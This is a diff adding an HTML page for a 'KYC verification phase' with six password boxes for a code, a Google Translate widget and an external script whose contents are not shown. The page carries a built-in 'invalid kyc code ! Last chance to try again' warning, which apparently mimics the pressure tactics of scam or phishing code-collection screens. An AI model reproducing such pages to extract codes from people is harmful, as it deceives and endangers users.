@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- google font roboto -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+    <!-- ajax cdn link -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <title>Kyc Verification phase</title>
+    <link rel="stylesheet" href="../../bootstrap5/css/all.css">
+    <link rel="stylesheet" href="../../styles/security-box.css">
+</head>
+<body>
+
+
+    <!-- google translator -->
+    <div class="custom-translate-box">
+        <div id="google_translate_element"></div>
+
+        <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+            pageLanguage: 'en', // Set your default language (e.g., 'en' for English)
+            includedLanguages: 'en,fr,de,es,it,pt,hi,ar,pl,sv', // Optional: Specify languages you want to support
+            layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+            }, 'google_translate_element');
+        }
+        </script>
+
+        <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    </div>
+    <!-- google translator -->
+
+    <main>
+        <div class="container">
+            <h2>Kyc Verification phase</h2>
+            <p>Please enter your kyc code</p>
+            <div class="box">
+                <div class="input-box">
+                    <input type="password" name="code" id="code">
+                </div>
+                <div class="input-box">
+                    <input type="password" name="code" id="code">
+                </div>
+                <div class="input-box">
+                    <input type="password" name="code" id="code">
+                </div>
+                <div class="input-box">
+                    <input type="password" name="code" id="code">
+                </div>
+                <div class="input-box">
+                    <input type="password" name="code" id="code">
+                </div>
+                <div class="input-box">
+                    <input type="password" name="code" id="code">
+                </div>
+            </div>
+            <div class="error">
+                <p>invalid kyc code ! Last chance to try again</p>
+            </div>
+            <button id="btn">Verify</button>
+            <p>Don't have a kyc code? <b>get kyc</b></p>
+        </div>
+    </main>
+
+    <script src="../../script/kyc18_pending.js"></script>
+    
+</body>
+</html>
